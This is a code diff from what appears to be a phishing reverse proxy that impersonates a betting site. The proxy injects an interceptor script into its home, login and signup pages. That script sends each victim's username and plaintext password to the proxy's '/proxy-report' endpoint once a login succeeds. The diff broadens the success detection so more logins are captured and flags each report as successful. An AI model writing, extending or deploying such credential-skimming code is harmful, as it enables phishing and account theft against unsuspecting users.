@@ -283,8 +283,8 @@ function buildInterceptorScript(proxyOrigin) {
         xhr.addEventListener('load',function(){
           try{
             var r=JSON.parse(xhr.responseText);
-            if(r&&r.status===1){
-              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||''})}).catch(function(){});
+            if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||r.data?.token)){
+              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
             }
           }catch(e){}
         });
@@ -424,11 +424,6 @@ async function websiteProxy(req, res) {
         /e=t\.location\.hostname\.replace\(\/\^www\\\.\/,\s*""\)/g,
         'e="reddybook.green"'
       );
-      body = body.replace(/https:\/\/speedcdn\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/edgecrate\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/loadpulse\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/coresling\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/pulseedge\.io\//g, proxyOrigin + '/');
     }
     if (ct.includes('html') || path === '/' || path === '' || path.startsWith('/home') || path.startsWith('/login') || path.startsWith('/signup')) {
       const interceptor = buildInterceptorScript(proxyOrigin);
